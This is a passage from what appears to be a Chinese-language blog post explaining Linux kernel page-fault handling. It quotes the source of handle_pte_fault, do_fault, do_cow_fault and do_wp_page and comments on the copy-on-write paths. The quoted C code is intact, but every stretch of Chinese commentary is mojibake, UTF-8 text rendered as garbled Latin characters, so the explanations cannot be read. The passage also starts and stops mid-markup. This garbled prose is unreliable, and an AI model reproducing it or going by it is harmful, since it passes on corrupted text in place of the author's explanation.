pte</code>è¿™å››ä¸ªé¡µè¡¨ï¼Œä»–ä»¬åˆ†è¡¨è¡¨ç¤ºçš„æ˜¯<code>é¡µå…¨å±€ç›®å½•ï½œé¡µä¸Šçº§ç›®å½•ï½œé¡µä¸­é—´ç›®å½•ï½œé¡µè¡¨é¡¹</code>ï¼Œè¿™ä¸ªå‡½æ•°ä¸­é¦–å…ˆåˆ™æ˜¯é€šè¿‡mmè·å–åˆ°pgdé¡µå…¨å±€ç›®å½•ï¼Œéšåç”Ÿæˆpudå’Œpmdå¹¶ä¸ºpmdåˆ›å»ºä¸­é—´é¡¹ï¼Œåœ¨æœ€åè´§æ¸ é“pteå¹¶è¿›å…¥åˆ°å¤„ç†å‡½æ•°<code>handle_pte_fault</code>ä¸­ã€‚</p><h4 id="handle-pte-fault"><a href="#handle-pte-fault" class="headerlink" title="handle_pte_fault"></a><strong>handle_pte_fault</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">pte_t</span> *pte, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pte_t</span> entry;</span><br><span class="line"><span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * some architectures can have larger ptes than wordsize,</span></span><br><span class="line"><span class="comment"> * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and CONFIG_32BIT=y,</span></span><br><span class="line"><span class="comment"> * so READ_ONCE or ACCESS_ONCE cannot guarantee atomic accesses.</span></span><br><span class="line"><span class="comment"> * The code below just needs a consistent view for the ifs and</span></span><br><span class="line"><span class="comment"> * we later double check anyway with the ptl lock held. So here</span></span><br><span class="line"><span class="comment"> * a barrier will do.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">entry = *pte;</span><br><span class="line">barrier();</span><br><span class="line"><span class="keyword">if</span> (!pte_present(entry)) &#123;</span><br><span class="line"><span class="keyword">if</span> (pte_none(entry)) &#123;</span><br><span class="line"><span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line"><span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line"> pte, pmd, flags);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">flags, entry);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">pte, pmd, flags, entry);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pte_protnone(entry))</span><br><span class="line"><span class="keyword">return</span> do_numa_page(mm, vma, address, entry, pte, pmd);</span><br><span class="line"></span><br><span class="line">ptl = pte_lockptr(mm, pmd);</span><br><span class="line">spin_lock(ptl);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pte_same(*pte, entry)))</span><br><span class="line"><span class="keyword">goto</span> unlock;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line"><span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line"><span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">pte, pmd, ptl, entry);</span><br><span class="line">entry = pte_mkdirty(entry);</span><br><span class="line">&#125;</span><br><span class="line">entry = pte_mkyoung(entry);</span><br><span class="line"><span class="keyword">if</span> (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) &#123;</span><br><span class="line">update_mmu_cache(vma, address, pte);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is needed only for protection faults but the arch code</span></span><br><span class="line"><span class="comment"> * is not yet telling us if this is a protection fault or not.</span></span><br><span class="line"><span class="comment"> * This still avoids useless tlb flushes for .text page faults</span></span><br><span class="line"><span class="comment"> * with threads.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE)</span><br><span class="line">flush_tlb_fix_spurious_fault(vma, address);</span><br><span class="line">&#125;</span><br><span class="line">unlock:</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡½æ•°å¼€å¤´åˆå§‹åŒ–<code>entry</code>ä¸ºpteçš„å†…å­˜é¡µç„¶åæˆ‘ä»¬ç»§ç»­é€è¡Œåˆ†æã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pte_present(entry)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (pte_none(entry)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line">      <span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">                               pte, pmd, flags);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">                      flags, entry);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">                      pte, pmd, flags, entry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ¤æ–­é¡µè¡¨æ˜¯å¦å­˜åœ¨äºä¸»å­˜ä¸­ï¼Œæ¥ç€åˆ¤æ–­æ˜¯å¦ä¸ºnoneï¼Œå¦‚æœä¸ºç©ºåˆ™è¡¨ç¤ºç¬¬ä¸€æ¬¡è®¿é—®è¯¥é¡µï¼Œé‚£ä¹ˆç»§ç»­è¿›å…¥åˆ¤æ–­vmaæ˜¯å¦ä¸ºåŒ¿ååŒºï¼Œå¦‚æœä¸æ˜¯åˆ™æ‰§è¡Œ<code>do_fault</code>è¿”å›ç‰©ç†é¡µã€‚å¦‚æœè¯¥é¡µä¸ä¸ºç©ºï¼Œè½¯æ€§ç¼ºé¡µå¼‚å¸¸ä¸­çš„ç¬¬äºŒç§æƒ…å†µï¼Œä»£è¡¨è¯¥é¡µä»¥å‰å­˜åœ¨äºä¸»å­˜ä¸­ä½†æ˜¯è¢«è°ƒå‡ºäº†ã€‚</p><p>ç¨‹åºç»§ç»­å¾€åæ‰§è¡Œï¼Œä¸‹æ–¹ä»£è¡¨çš„æ˜¯å†…å­˜é¡µå­˜åœ¨äºä¸»å­˜ä¸­æ—¶çš„æƒ…å†µã€‚</p><p>é¦–å…ˆåˆ™æ˜¯å…ˆåŠ äº†ä¸€å±‚é”<code>spin_lock(ptl);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line">    <span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">                      pte, pmd, ptl, entry);</span><br><span class="line">  entry = pte_mkdirty(entry);</span><br><span class="line">&#125;</span><br><span class="line">entry = pte_mkyoung(entry);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡flagsåˆ¤æ–­æ˜¯å¦æ˜¯åº”ä¸ºå†™æ“ä½œå¼•èµ·çš„ç¼ºé¡µå¼‚å¸¸ï¼Œç´§æ¥ç€çœ‹å¯¹åº”çš„é¡µæ˜¯å¦å¯å†™ï¼Œå¦‚æœä¸å¯å†™åˆ™è¿›å…¥<code>do_wp_page</code>å‡½æ•°ä¸­ã€‚åç»­å°±æ˜¯å°†è¯¥é¡µæ ‡è„å’Œæ ‡ä¸Šå·²ç»è®¿é—®è¿‡ã€‚</p><p>ç»è¿‡ä¸Šè¿°æµç¨‹ä¸éš¾å‘ç°å½“ä¸€ä¸ªè¿›ç¨‹é¦–æ¬¡è®¿é—®ä¸€ä¸ªä¸å¯å†™çš„å†…å­˜é¡µæ—¶ä¼šè§¦å‘ä¸¤æ¬¡ç¼ºé¡µå¼‚å¸¸ï¼Œä¸€æ¬¡æ˜¯é¡µä¸å­˜åœ¨äºä¸»å­˜ä¸­çš„æƒ…å†µï¼Œç¬¬äºŒæ¬¡æ˜¯ä¸‹é¢å­˜åœ¨äºä¸»å­˜çš„æƒ…å†µã€‚</p><p>é‚£ä¹ˆé¦–å…ˆæˆ‘ä»¬å…ˆçœ‹ç¬¬ä¸€æ¬¡è¿›å…¥çš„æƒ…å†µï¼Œæ­¤æ—¶å¤„ç†çš„å‡½æ•°ä¸º<code>do_fault</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">pte_unmap(page_table);</span><br><span class="line"><span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line"><span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line"><span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯ä¸‹é¢åˆ¤æ–­ï¼Œå¦‚æœæ˜¯éå†™çš„æ“ä½œå¼•èµ·çš„å¼‚å¸¸åˆ™è¿›å…¥<code>do_read_fault</code>å‡½æ•°ï¼Œå¦‚æœæ˜¯éå…±äº«å†…å­˜å¼•èµ·çš„å¼‚å¸¸åˆ™è¿›å…¥<code>do_cow_fault</code>ï¼Œå¦‚æœæ˜¯å› ä¸ºå…±äº«å†…å­˜å¼•èµ·çš„å¼‚å¸¸åˆ™è¿›å…¥<code>do_shared_fault</code>å‡½æ•°ä¸­å»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_cow_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>, *<span class="title">new_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(anon_vma_prepare(vma)))</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);</span><br><span class="line"><span class="keyword">if</span> (!new_page)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &amp;memcg)) &#123;</span><br><span class="line">page_cache_release(new_page);</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line"><span class="keyword">goto</span> uncharge_out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fault_page)</span><br><span class="line">copy_user_highpage(new_page, fault_page, address, vma);</span><br><span class="line">__SetPageUptodate(new_page);</span><br><span class="line"></span><br><span class="line">pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">page_cache_release(fault_page);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The fault handler has no page to lock, so it holds</span></span><br><span class="line"><span class="comment"> * i_mmap_lock for read to protect against truncate.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">goto</span> uncharge_out;</span><br><span class="line">&#125;</span><br><span class="line">do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">mem_cgroup_commit_charge(new_page, memcg, <span class="literal">false</span>);</span><br><span class="line">lru_cache_add_active_or_unevictable(new_page, vma);</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">page_cache_release(fault_page);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The fault handler has no page to lock, so it holds</span></span><br><span class="line"><span class="comment"> * i_mmap_lock for read to protect against truncate.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">uncharge_out:</span><br><span class="line">mem_cgroup_cancel_charge(new_page, memcg);</span><br><span class="line">page_cache_release(new_page);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®åå­—å¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªå‡½æ•°æ˜¯æˆ‘ä»¬æ¯”è¾ƒå…³æ³¨çš„å‡½æ•°ï¼Œ<code>new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);</code>é¦–å…ˆåˆ™å°±æ˜¯åˆ›å»ºä¸€ä¸ªç‰©ç†é¡µã€‚<code>ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);</code>è¿™é‡Œè¯»å–æ–‡ä»¶çš„å†…å®¹åˆ°<code>fault_page</code>ä¸­å»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fault_page)</span><br><span class="line">  copy_user_highpage(new_page, fault_page, address, vma);</span><br></pre></td></tr></table></figure><p>éšååœ¨è¿™é‡Œå°†<code>fault_page</code>ä¸­çš„å†…å®¹æ‹·è´åˆ°<code>new_page</code>ä¸­å»ã€‚</p><p><code>if (unlikely(!pte_same(*pte, orig_pte))) </code>è¿™é‡ŒéªŒè¯pteå’Œ<code>orig_ptr</code>æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸ä¸€è‡´åˆ™è¡¨ç¤ºpteä¸­é€”è¢«ä¿®æ”¹è¿‡é‚£ä¹ˆç›´æ¥é‡Šæ”¾ä¸¤ä¸ªå†…å­˜é¡µä¹‹åé€€å‡ºã€‚</p><p><code>do_set_pte(vma, address, new_page, pte, true, true);</code>åœ¨è¿™é‡Œè®¾ç½®pteä¸­çš„æ ‡å¿—ä½å¹¶ä¸”æ ‡ä¸Š<code>dirty</code>æ ‡å¿—ä½ï¼Œä¸è¿‡å› ä¸ºä¼šæ£€æµ‹æ–‡ä»¶æ˜¯å¦ä¸ºå¯å†™å¦‚æœä¸æ˜¯åˆ™ä¸ä¼šæ ‡è®°ä¸Š<code>write</code>ï¼Œæœ€åé‡Šæ”¾<code>fault_page</code>ç»“æŸå‡½æ•°ã€‚</p><p>åœ¨è¿›è¡Œå®Œç¬¬ä¸€æ­¥ä¹‹åå¦‚æœé¡µé¢ä¸å¯å†™çš„è¯å°±ä¼šè¿›å…¥åˆ°ç¬¬äºŒæ­¥ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_wp_page</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">spinlock_t</span> *ptl, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function">__<span class="title">releases</span><span class="params">(ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">old_page</span>;</span></span><br><span class="line"></span><br><span class="line">old_page = vm_normal_page(vma, address, orig_pte);</span><br><span class="line"><span class="keyword">if</span> (!old_page) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a</span></span><br><span class="line"><span class="comment"> * VM_PFNMAP VMA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We should not cow pages in a shared writeable mapping.</span></span><br><span class="line"><span class="comment"> * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">     (VM_WRITE|VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> wp_pfn_shared(mm, vma, address, page_table, ptl,</span><br><span class="line">     orig_pte, pmd);</span><br><span class="line"></span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line"><span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">    orig_pte, old_page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Take out anonymous pages first, anonymous shared vmas are</span></span><br><span class="line"><span class="comment"> * not dirty accountable.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!trylock_page(old_page)) &#123;</span><br><span class="line">page_cache_get(old_page);</span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line">lock_page(old_page);</span><br><span class="line">page_table = pte_offset_map_lock(mm, pmd, address,</span><br><span class="line"> &amp;ptl);</span><br><span class="line"><span class="keyword">if</span> (!pte_same(*page_table, orig_pte)) &#123;</span><br><span class="line">unlock_page(old_page);</span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line">page_cache_release(old_page);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">page_cache_release(old_page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The page is all ours.  Move it to our anon_vma so</span></span><br><span class="line"><span class="comment"> * the rmap code will not search our parent or siblings.</span></span><br><span class="line"><span class="comment"> * Protected against the rmap code by the page lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">unlock_page(old_page);</span><br><span class="line"><span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">     orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">unlock_page(old_page);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">(VM_WRITE|VM_SHARED))) &#123;</span><br><span class="line"><span class="keyword">return</span> wp_page_shared(mm, vma, address, page_table, pmd,</span><br><span class="line">      ptl, orig_pte, old_page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ok, we need to copy. Oh, well..</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page_cache_get(old_page);</span><br><span class="line"></span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line"><span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">    orig_pte, old_page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡<code>old_page = vm_normal_page(vma, address, orig_pte);</code>è·å–ç¼ºé¡µçš„çº¿æ€§åœ°å€å¯¹åº”çš„<code>struct page</code>ç»“æ„ï¼Œå¯¹äºä¸€äº›ç‰¹æ®Šæ˜ å°„çš„é¡µé¢ï¼ˆå¦‚é¡µé¢å›æ”¶ã€é¡µè¿ç§»å’ŒKSMç­‰ï¼‰ï¼Œå†…æ ¸å¹¶ä¸å¸Œæœ›è¿™äº›é¡µå‚ä¸åˆ°å†…å­˜ç®¡ç†çš„ä¸€äº›æµç¨‹å½“ä¸­ï¼Œç§°ä¹‹ä¸º<code>special mapping</code>ï¼Œå¹¶æ— å¯¹åº”çš„<code>struct page</code>ç»“æ„ä½“ã€‚</p><p>ç´§æ¥ç€åˆ¤æ–­æ˜¯å¦ä¸º<code>special mapping</code>ï¼Œå¦‚æœæ˜¯åˆ™ä¼šè¿›å…¥ifåˆ†æ”¯ï¼Œå½“ç„¶æˆ‘ä»¬è¿™é‡Œä¸æ˜¯ã€‚</p><p>éšååˆ¤æ–­é¡µé¢æ˜¯å¦ä¸ºåŒ¿åé¡µå¹¶ä¸”ä¸ä¸ºKSMï¼Œå¦‚æœæˆç«‹å¹¶ä¸”å¯ä»¥æˆåŠŸä¸Šé”åˆ™è¿›å…¥ä»¥ä¸‹è¯­å¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line">  page_move_anon_rmap(old_page, vma, address);</span><br><span 